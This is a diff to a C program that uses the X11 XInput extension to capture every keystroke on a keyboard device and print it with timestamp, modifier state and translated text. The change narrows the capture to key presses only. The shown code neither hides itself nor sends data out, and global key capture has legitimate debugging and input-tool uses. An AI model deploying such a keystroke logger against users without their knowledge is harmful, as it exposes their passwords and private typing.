@@ -7,7 +7,6 @@
 #include <X11/extensions/XInput.h>
 
 static int KEY_PRESS_TYPE;
-static int KEY_RELEASE_TYPE;
 
 static void process_event( XDeviceKeyEvent *event , KeySym tr_keysym , char *tr_string )
 {
@@ -23,9 +22,8 @@ static void process_event( XDeviceKeyEvent *event , KeySym tr_keysym , char *tr_
     strftime( time_buf , 20 , "%d/%m/%Y %H:%M:%S" , localtime( &now ) );
 
     /* dump keystroke info */
-    printf( "%s %c %c %c %c %c %c %c %c %i %s" ,
+    printf( "%s %c %c %c %c %c %c %c %i %s" ,
             time_buf ,
-            event->type == KEY_PRESS_TYPE ? 'P' : 'R' ,
             event->state & ShiftMask ? 'S' : 's' ,
             event->state & LockMask ? 'L' : 'l' ,
             event->state & ControlMask ? 'C' : 'c' ,
@@ -37,7 +35,7 @@ static void process_event( XDeviceKeyEvent *event , KeySym tr_keysym , char *tr_
             XKeysymToString( keysym ) );
 
     /* dump translate keystroke (if available) */
-    if ( event->type == KEY_PRESS_TYPE && *tr_string )
+    if ( *tr_string )
     {
         printf( " %s %s" , tr_string , XKeysymToString( tr_keysym ) );
     }
@@ -108,7 +106,7 @@ int main( int argc , char *argv[] )
     Window root;
     XID keyboard_id;
     XDevice *device;
-    XEventClass event_class[ 2 ];
+    XEventClass event_class;
     XIC xic;
 
     /* open display */
@@ -140,9 +138,8 @@ int main( int argc , char *argv[] )
     xic = get_input_context( display );
 
     /* register events */
-    DeviceKeyPress( device , KEY_PRESS_TYPE , event_class[ 0 ] );
-    DeviceKeyRelease( device , KEY_RELEASE_TYPE , event_class[ 1 ] );
-    XSelectExtensionEvent( display , root , event_class , 2 );
+    DeviceKeyPress( device , KEY_PRESS_TYPE , event_class );
+    XSelectExtensionEvent( display , root , &event_class , 1 );
 
     /* event loop */
     while ( 1 )
@@ -154,8 +151,7 @@ int main( int argc , char *argv[] )
         /* wait for the next event */
         XNextEvent( display , &event );
 
-        /* translate keystroke (key press only) */
-        if ( event.type == KEY_PRESS_TYPE )
+        /* translate keystroke */
         {
             XDeviceKeyEvent *device_key_event;
             XKeyEvent key_event;
